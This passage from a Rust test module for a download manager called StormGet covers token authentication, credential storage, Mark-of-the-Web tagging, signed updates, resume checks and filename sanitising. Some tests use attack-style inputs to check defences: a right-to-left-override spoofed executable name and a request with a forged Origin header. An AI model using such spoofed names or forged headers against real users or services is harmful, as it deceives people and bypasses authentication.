        streamer_ctx.extend_from_slice(po_raw);

        let mut abr_req = vec![0x0A, streamer_ctx.len() as u8];
        abr_req.extend_from_slice(&streamer_ctx);

        let b64_req = encode_base64_standard(&abr_req);
        let expected_po_b64 = encode_base64_standard(po_raw);

        let session = SabrSessionPayload {
            video_id: "dQw4w9WgXcQ".to_string(),
            server_abr_streaming_url:
                "https://rr2---sn-4g5ednsd.googlevideo.com/videoplayback?sabr=1&itag=137"
                    .to_string(),
            video_playback_ustreamer_config: "EooBCg9YxwE=".to_string(),
            client_info: None,
            video_itag: Some(137),
            audio_itag: 140,
            request_body: Some(b64_req),
            formats: vec![
                SabrFormatItem {
                    itag: 137,
                    mime_type: "video/mp4; codecs=\"avc1.640028\"".to_string(),
                    width: Some(1920),
                    height: Some(1080),
                    fps: Some(60),
                    bitrate: Some(4_500_000),
                    content_length: Some("50000000".to_string()),
                    approx_duration_ms: Some("212000".to_string()),
                    ..Default::default()
                },
                SabrFormatItem {
                    itag: 140,
                    mime_type: "audio/mp4; codecs=\"mp4a.40.2\"".to_string(),
                    bitrate: Some(128_000),
                    content_length: Some("999999".to_string()),
                    is_drc: true,
                    ..Default::default()
                },
                SabrFormatItem {
                    itag: 140,
                    mime_type: "audio/mp4; codecs=\"mp4a.40.2\"".to_string(),
                    bitrate: Some(128_000),
                    content_length: Some("3400000".to_string()),
                    approx_duration_ms: Some("212000".to_string()),
                    audio_track: Some(SabrAudioTrackInfo {
                        id: "en.4".to_string(),
                        audio_is_default: true,
                    }),
                    is_drc: false,
                    is_vb: false,
                    ..Default::default()
                },
            ],
        };

        let norm = normalize_sabr_session(&session).expect("verified in test");
        assert_eq!(norm.video_id, "dQw4w9WgXcQ");
        assert_eq!(norm.video_itag, Some(137));
        assert_eq!(norm.audio_itag, 140);
        assert_eq!(norm.estimated_total_bytes, Some(53_400_000));
        assert_eq!(norm.approx_duration_secs, Some(212));
        assert_eq!(norm.po_token.as_deref(), Some(expected_po_b64.as_str()));
        assert_eq!(norm.client_name, 1);
        assert_eq!(norm.client_version, "2.20261027");
    }

    #[test]
    fn test_awesome_feature2_auto_browser_extension_discovery() {
        let sample_prefs = r#"{
            "extensions": {
                "settings": {
                    "abcdefghijklmnopabcdefghijklmnop": {
                        "path": "C:\\StormGet\\chrome-extension",
                        "manifest": {
                            "name": "StormGet (RustIDM) Integration Module v2.3"
                        }
                    },
                    "invalid_short_id": {
                        "manifest": {
                            "name": "StormGet"
                        }
                    }
                }
            }
        }"#;

        let ids = discover_extension_ids_in_preferences(sample_prefs, None);
        assert_eq!(ids, vec!["abcdefghijklmnopabcdefghijklmnop".to_string()]);
        assert!(is_valid_chromium_extension_id("abcdefghijklmnopabcdefghijklmnop"));
        assert!(!is_valid_chromium_extension_id("xyzdefghijklmnopabcdefghijklmnop"));
        assert!(is_valid_firefox_extension_id("extension@rustidm.local"));
    }

    #[test]
    fn test_awesome_feature3_cryptographic_bridge_token_and_constant_time_auth() {
        let tok1 = generate_bridge_token();
        let tok2 = generate_bridge_token();
        assert_eq!(tok1.len(), 64);
        assert_ne!(tok1, tok2);
        assert!(constant_time_token_eq(&tok1, &tok1));
        assert!(!constant_time_token_eq(&tok1, &tok2));
        assert!(!constant_time_token_eq(&tok1, "short"));

        let mut valid_bearer = AxumHeaderMap::new();
        valid_bearer.insert(
            "authorization",
            HeaderValue::from_str(&format!("Bearer {tok1}")).expect("verified in test"),
        );
        assert!(is_authorized_ipc_request_with_token(
            &Method::POST,
            "/api/v1/config",
            &valid_bearer,
            Some(&tok1)
        ));

        let mut wrong_bearer = AxumHeaderMap::new();
        wrong_bearer.insert(
            "authorization",
            HeaderValue::from_str(&format!("Bearer {tok2}")).expect("valid header"),
        );
        wrong_bearer.insert("x-rustidm", HeaderValue::from_static("1"));
        assert!(!is_authorized_ipc_request_with_token(
            &Method::POST,
            "/api/v1/config",
            &wrong_bearer,
            Some(&tok1)
        ));

        // التحقق من أن ترويسة X-RustIDM: 1 الثابتة وحدها تُرفض تماماً عندما يكون رمز الجلسة مفعلاً (حتى مع تزوير Origin)
        let mut static_only = AxumHeaderMap::new();
        static_only.insert("x-rustidm", HeaderValue::from_static("1"));
        static_only.insert(
            "origin",
            HeaderValue::from_static("chrome-extension://abcdefghijklmnop"),
        );
        assert!(
            !is_authorized_ipc_request_with_token(
                &Method::POST,
                "/api/v1/intercept",
                &static_only,
                Some(&tok1)
            ),
            "يجب رفض X-RustIDM: 1 وحدها بدون رمز Bearer الصحيح حتى لو زوّر المهاجم ترويسة Origin"
        );
    }

    #[test]
    fn test_ezoo_feature1_and_2_http1_probe_fallback_matrix_and_transient_network_classifier() {
        let mut hdrs = HeaderMap::new();
        hdrs.insert("cookie", HeaderValue::from_static("SID=secret"));
        hdrs.insert("referer", HeaderValue::from_static("https://example.com/page"));

        let matrix = build_probe_fallback_matrix(&hdrs);
        assert_eq!(matrix.len(), 4);
        assert!(matrix[0].0 && matrix[0].1.contains_key("cookie"));
        assert!(!matrix[1].0 && matrix[1].1.contains_key("cookie"));
        assert!(matrix[2].0 && !matrix[2].1.contains_key("cookie"));
        assert!(!matrix[3].0 && !matrix[3].1.contains_key("referer"));

        assert!(is_transient_network_error("connection reset by peer"));
        assert!(is_transient_network_error("انتهت مهلة قراءة البيانات من الشبكة"));
        assert!(!is_transient_network_error("URL_EXPIRED: HTTP 403 Forbidden"));
    }

    #[test]
    fn test_ezoo_feature3_dpapi_secret_header_map_and_credential_encryption() {
        let mut headers = HashMap::new();
        headers.insert("cookie".to_string(), "SID=my_secret_cookie".to_string());
        headers.insert("user-agent".to_string(), "StormGet/2.3".to_string());

        let login = SiteLoginCredential {
            domain: "example.com".to_string(),
            username: "ahmed".to_string(),
            auth_header_or_cookie: "Bearer top_secret_token".to_string(),
            enabled: true,
        };
        let login_json = serde_json::to_string(&login).expect("verified in test");
        let restored_login: SiteLoginCredential = serde_json::from_str(&login_json).expect("verified in test");
        assert_eq!(restored_login.auth_header_or_cookie, "Bearer top_secret_token");
        assert_eq!(open("dpapi:invalid_hex"), "");
    }

    #[test]
    fn test_ezoo_feature4_ytdlp_audio_rank_av1_and_playlist_parser() {
        let orig_audio = serde_json::json!({
            "format_note": "English original",
            "format_id": "140-orig",
            "language_preference": 10
        });
        let dubbed_audio = serde_json::json!({
            "format_note": "Arabic dubbed",
            "format_id": "140-dub",
            "language_preference": 0
        });
        assert!(audio_track_rank(&orig_audio) > audio_track_rank(&dubbed_audio));
        assert!(is_av1_vcodec("av01.0.08M.08"));
        assert!(!is_av1_vcodec("avc1.640028"));
        assert!(needs_login_or_cookies("ERROR: Sign in to confirm you're not a bot"));
        assert_eq!(canonical_cookie_site("https://youtu.be/dQw4w9WgXcQ"), "youtube.com");

        let sample_playlist = serde_json::json!({
            "_type": "playlist",
            "title": "Rust Course",
            "entries": [
                {"id": "vid00000001", "title": "Lesson 1", "duration": 300},
                {"id": "vid00000002", "title": "[Deleted video]", "duration": 0}
            ]
        });
        let pl = parse_playlist_json(&sample_playlist);
        assert_eq!(pl.title, "Rust Course");
        assert_eq!(pl.entries.len(), 1);
        assert_eq!(pl.entries[0].url, "https://www.youtube.com/watch?v=vid00000001");
    }

    #[test]
    fn test_ezoo_feature5_and_6_preview_hard_link_and_mark_of_the_web() {
        let motw = build_zone_identifier_content(
            "https://user:secret_pw@cdn.example.com/installer.exe?dl=1#frag",
            Some("https://example.com/downloads"),
        );
        assert!(motw.starts_with("[ZoneTransfer]\r\nZoneId=3\r\n"));
        assert!(motw.contains("HostUrl=https://cdn.example.com/installer.exe?dl=1\r\n"));
        assert!(motw.contains("ReferrerUrl=https://example.com/downloads\r\n"));
        assert!(!motw.contains("secret_pw") && !motw.contains("#frag"));

        assert_eq!(
            split_command_args(r#"/scan "C:\My Downloads\setup.exe" --quiet"#),
            vec!["/scan", r"C:\My Downloads\setup.exe", "--quiet"]
        );
    }

    #[test]
    fn test_ezoo_feature7_and_8_bittorrent_bencode_ed25519_selfupdate_and_winfx() {
        // 1. BitTorrent Bencode + Magnet test
        let torrent_bytes = b"d4:infod6:lengthi1048576e4:name10:ubuntu.isoee";
        let info = parse_torrent(torrent_bytes).expect("verified in test");
        assert_eq!(info.name, "ubuntu.iso");
        assert_eq!(info.total_size, 1_048_576);
        assert!(is_magnet("magnet:?xt=urn:btih:0123456789abcdef0123456789abcdef01234567&dn=Ubuntu+24.04"));
        assert_eq!(
            magnet_name("magnet:?xt=urn:btih:0123456789abcdef0123456789abcdef01234567&dn=Ubuntu+24.04").as_deref(),
            Some("Ubuntu 24.04")
        );

        // 2. Ed25519 Signed Self-Update test
        use ring::signature::{Ed25519KeyPair, KeyPair};
        let kp = Ed25519KeyPair::from_seed_unchecked(&[9u8; 32]).expect("verified in test");
        let pub_hex: String = kp.public_key().as_ref().iter().map(|b| format!("{b:02x}")).collect();
        let sha = sha256_bytes_hex(b"stormget_v2_4_setup");
        let sig_hex: String = kp
            .sign(signed_message("2.4.0", &sha).as_bytes())
            .as_ref()
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect();
        let manifest = SignedReleaseManifest {
            version: "2.4.0".to_string(),
            url: String::new(),
            sha256: sha,
            sig: sig_hex,
        };
        assert!(signature_ok(&manifest, &pub_hex));
        assert!(is_newer_version("2.4.0", "2.3.4"));

        // 3. WinFX centering test
        assert_eq!(centered_window_position((0, 0), (1920, 1080), (1000, 600)), (460, 240));
    }

    #[test]
    fn test_velox_feature1_and_2_sample_resume_and_per_segment_sha256_verification() {
        // 1. Sample-based resume validators & non-overlapping 64KB sample windows
        assert_eq!(
            evaluate_resume_validators(Some("\"strong\""), None, Some("\"strong\""), None),
            Ok(ResumeProof::Proven)
        );
        assert_eq!(
            evaluate_resume_validators(Some("W/\"weak1\""), Some("d1"), Some("W/\"weak1\""), Some("d1")),
            Ok(ResumeProof::Likely)
        );
        assert!(evaluate_resume_validators(Some("W/\"weak1\""), None, Some("W/\"weak2\""), None).is_err());

        let big = SAMPLE_LEN * 4;
        let segs = vec![
            FileSegment {
                id: 0,
                start_byte: 0,
                current_offset: big,
                end_byte: big - 1,
                status: SegmentStatus::Completed,
                split_count: 0,
                last_speed_bps: 0,
            },
            FileSegment {
                id: 1,
                start_byte: big,
                current_offset: big + SAMPLE_LEN * 3,
                end_byte: 2 * big - 1,
                status: SegmentStatus::Downloading,
                split_count: 0,
                last_speed_bps: 0,
            },
        ];
        let windows = compute_sample_windows(&segs, RESUME_SAMPLES);
        assert_eq!(windows.len(), 4);

        // 2. Per-segment SHA-256 hash & corruption recovery
        let tmp_part = std::env::temp_dir().join(format!("stormget_seg_verify_{}.part", Uuid::new_v4()));
        let mut raw_data = vec![0xAAu8; 2000];
        raw_data[1000..2000].fill(0xBB);
        std::fs::write(&tmp_part, &raw_data).expect("verified in test");

        let mut test_segs = vec![
            FileSegment {
                id: 0,
                start_byte: 0,
                current_offset: 1000,
                end_byte: 999,
                status: SegmentStatus::Completed,
                split_count: 0,
                last_speed_bps: 0,
            },
            FileSegment {
                id: 1,
                start_byte: 1000,
                current_offset: 2000,
                end_byte: 1999,
                status: SegmentStatus::Completed,
                split_count: 0,
                last_speed_bps: 0,
            },
        ];
        let mut manifest = PartVerifyManifest::default();
        let hashed_count = hash_completed_segments_in_manifest(&tmp_part, &test_segs, &mut manifest).expect("verified in test");
        assert_eq!(hashed_count, 2);

        // Corrupt only segment #1 on disk
        raw_data[1500] = 0xFF;
        std::fs::write(&tmp_part, &raw_data).expect("verified in test");

        let report = reverify_completed_segments_with_manifest(&tmp_part, &mut test_segs, &mut manifest).expect("verified in test");
        assert_eq!(report.checked, 2);
        assert_eq!(report.invalid, 1);
        assert_eq!(report.invalid_bytes, 1000);
        assert_eq!(test_segs[0].status, SegmentStatus::Completed);
        assert_eq!(test_segs[1].status, SegmentStatus::Pending);
        assert_eq!(test_segs[1].current_offset, 1000);
        let _ = std::fs::remove_file(&tmp_part);
    }

    #[test]
    fn test_velox_feature3_and_4_publisher_checksum_and_adaptive_connections() {
        // 1. Publisher checksum list parser (GNU, BSD, PGP-signed, SHA-512 over SHA-256)
        let sha256_a = "a".repeat(64);
        let sha512_c = "c".repeat(128);
        let list_text = format!(
            "-----BEGIN PGP SIGNED MESSAGE-----\n\n{sha256_a} *ubuntu-24.04.iso\nSHA512 (ubuntu-24.04.iso) = {sha512_c}\n"
        );
        let found = find_checksum_in_publisher_list(&list_text, "ubuntu-24.04.iso", false, "SHA256SUMS").expect("verified in test");
        assert_eq!(found.algo, PublisherHashAlgo::Sha512);
        assert_eq!(found.hex, sha512_c);

        // 2. Adaptive controller scaling 4 -> 16 -> 64 and backing off on 429/503
        let mut ctl = AdaptiveController::new(AdaptiveConfig::default(), 4, 64);
        assert_eq!(ctl.limit(), 4);
        let next1 = ctl.on_sample(AdaptiveSample {
            throughput_bps: 10_000_000.0,
            errors: 0,
            latency: Some(Duration::from_millis(40)),
            speed_limited: false,
        });
        assert_eq!(next1, Some(16));
        // Settle interval
        assert_eq!(
            ctl.on_sample(AdaptiveSample {
                throughput_bps: 25_000_000.0,
                errors: 0,
                latency: Some(Duration::from_millis(42)),
                speed_limited: false,
            }),
            None
        );
        // Next sample confirms >5% gain and scales 16 -> 64
        let next2 = ctl.on_sample(AdaptiveSample {
            throughput_bps: 30_000_000.0,
            errors: 0,
            latency: Some(Duration::from_millis(45)),
            speed_limited: false,
        });
        assert_eq!(next2, Some(64));
        // Server answers 429 -> halves connections immediately to 32
        assert_eq!(ctl.on_throttled(std::time::Instant::now()), Some(32));
    }

    #[test]
    fn test_velox_feature5_6_7_8_smart_throttle_doctor_lanes_and_path_safety() {
        // Feature 5: Smart Throttle & Game Mode + Priority App Matching
        let running = vec![r"C:\Riot Games\VALORANT\live\ShooterGame\Binaries\Win64\VALORANT-Win64-Shipping.exe".to_string()];
        let mut st = SmartThrottleStatus::default();
        st.mode = SmartThrottleMode::Smart;
        st.detected_priority_app = match_running_priority_app(&running, &st.watched_apps);
        assert_eq!(st.detected_priority_app.as_deref(), Some("VALORANT-Win64-Shipping"));
        let cap = st.recalculate_effective_limit(10_000, 0);
        assert_eq!(cap, 2500); // 25% of 10,000 KB/s

        st.set_game_mode(true, Some(60), 10_000);
        assert!(st.is_game_mode_currently_on());

        // Feature 6: Pre-Download Intelligence & Download Doctor
        let (is_temp, exp) = inspect_temporary_signed_url("https://cdn.example.com/video.mp4?sig=abc&expire=1893456000");
        assert!(is_temp);
        assert_eq!(exp, Some(1_893_456_000));

        let intel = evaluate_link_intelligence(
            "https://example.com/file.zip",
            "https://example.com/login",
            Some("text/html; charset=utf-8"),
            1024,
            false,
            None,
            None,
            &[],
        );
        assert_eq!(intel.resource_kind, ResourceKind::WebPage);
        assert!(intel.findings.contains(&FindingCode::WebPageInsteadOfFile));

        // Feature 7: Multi-Network Lane Bonding safety rules
        assert!(is_spreadable_https_url("https://releases.ubuntu.com/24.04/ubuntu.iso"));
        assert!(!is_spreadable_https_url("http://releases.ubuntu.com/24.04/ubuntu.iso"));
        assert!(!is_spreadable_https_url("https://127.0.0.1:16888/file.bin"));
        assert!(!is_spreadable_https_url("https://192.168.1.10/file.bin"));
        assert!(lane_crawls(100_000.0, 1_000_000.0));

        // Feature 8: Path Safety, RTLO BiDi Spoofing & Superscript Reserved Windows Devices
        let spoofed = "invoice\u{202e}fdp.exe";
        let cleaned = sanitize_filename(spoofed);
        assert!(!cleaned.contains('\u{202e}'));
        assert_eq!(cleaned, "invoicefdp.exe");
        assert!(is_reserved_windows_device_name("COM\u{b9}.txt"));
        assert!(is_reserved_windows_device_name("CONIN$"));
    }

    #[test]
    fn test_perf_bottlenecks_coalesced_writer_and_fast_redaction() {
        // 1. Verify SegmentWriteCoalescer batches small chunks and flushes accurately
        let tmp_path = std::env::temp_dir().join(format!("stormget_coalesce_{}.bin", Uuid::new_v4()));
        {
            let file = std::fs::OpenOptions::new()
                .create(true)
                .read(true)
                .write(true)
                .truncate(true)
                .open(&tmp_path)
                .expect("verified in test");
            let mut coalescer = SegmentWriteCoalescer::new(&file, 0);
            coalescer.push(b"HELLO_", 0).expect("verified in test");
            coalescer.push(b"WORLD_", 6).expect("verified in test");
            coalescer.push(b"256KB_COALESCED", 12).expect("verified in test");
            coalescer.flush().expect("verified in test");
        }
        let disk_bytes = std::fs::read(&tmp_path).expect("verified in test");
        assert_eq!(disk_bytes, b"HELLO_WORLD_256KB_COALESCED");
        let _ = std::fs::remove_file(&tmp_path);

        // 2. Verify fast-path log redaction skips clean messages in O(1) and redacts tokens
        assert!(!may_contain_unredacted_secret("تمت جدولة المهمة بنجاح"));
        assert_eq!(
            redact_log_message("https://cdn.example.com/file.mp4?token=secret123&id=5"),
            "https://cdn.example.com/file.mp4?token=[REDACTED]&id=5"
        );
    }
}

